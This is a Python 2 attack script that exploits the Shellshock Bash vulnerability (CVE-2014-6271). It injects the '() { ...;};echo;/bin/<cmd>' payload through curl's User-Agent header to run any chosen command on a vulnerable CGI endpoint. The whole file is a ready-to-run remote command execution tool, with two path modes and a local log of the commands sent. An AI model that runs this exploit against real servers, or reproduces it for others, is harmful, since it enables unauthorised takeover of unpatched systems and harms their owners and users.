#!/usr/bin/env python

'''
'
' Shellshock ( Bash CVE-2014-6271 ) Remote Command Execution Injector
' Written by snoww0lf ( www.cbfteam.web.id )
'
' Tools Coded with Python 
'
'''

try:
	import sys
	import optparse
	import subprocess
	import time
	from threading import Thread
except ImportError as e:
	print "[+] Error Found -> " + e

def author():
	print "[+] Written by snoww0lf - Shellshock Remote Command Execution Injector [+] \n"

def firstmode(cmd, cgi):
	syn = "curl -A '() { snoww0lf;};echo;/bin/"+cmd+"' " + cgi + ""
	try:
		print "[+] Your Command : %s" % (cmd)
		print "[+] Vuln CGI Url : %s" % (cgi)
		print "[+] Result : "
		output = subprocess.call(syn, shell=True)
		return output
	except Exception as e:
		print "Something went wrong!", e

def secondmode(cmd, cgi):
	syn = "curl -A '() { snoww0lf;};echo;/usr/bin/"+cmd+"' " \
			+ cgi + ""
	try:
		print "[+] Your Command : %s" % (cmd)
		print "[+] Vuln CGI Url : %s" % (cgi)
		print "[+] Result : "
		output = subprocess.call(syn, shell=True)
		return output
	except IOError as e:
		print "Something wrong with your command!"
	except Exception as e:
		print "Something went wrong!" + e

def log(cmd, cgi):
	now = time.strftime("%c")
	fh = open("l0g.txt", "a")
	fh.write("[+] Date: " + now + " --> " \
		+ cmd + cgi + "\n")
	fh.close()

def main():
	parser = optparse.OptionParser("%Usage "+\
	"-c <command> -u <vuln cgi url> -m <1/2>")
	parser.add_option('-c', dest='cmdname', type='string',\
	help='your command execution')
	parser.add_option('-u', dest='urlname', type='string',\
	help='vuln cgi url')
	parser.add_option('-m', dest='modename', type='int',\
	help='exploit mode')
	(pwnoption, args) = parser.parse_args()

	if pwnoption.cmdname is None or pwnoption.urlname is None \
	or pwnoption.modename is None:
		print parser.usage
		sys.exit()
	else:
		cmdname = pwnoption.cmdname
		urlname = pwnoption.urlname
		modename = pwnoption.modename

	if modename == 1:
		pwn = Thread(target=firstmode, args=(cmdname, urlname))
		pwn.start()
	elif modename == 2:
		pwn = Thread(target=secondmode, args=(cmdname, urlname))
		pwn.start()
	else:
		print "You have choosen the wrong mode!"
		print parser.usage
		sys.exit()

if __name__ == '__main__':
	author()
	main()
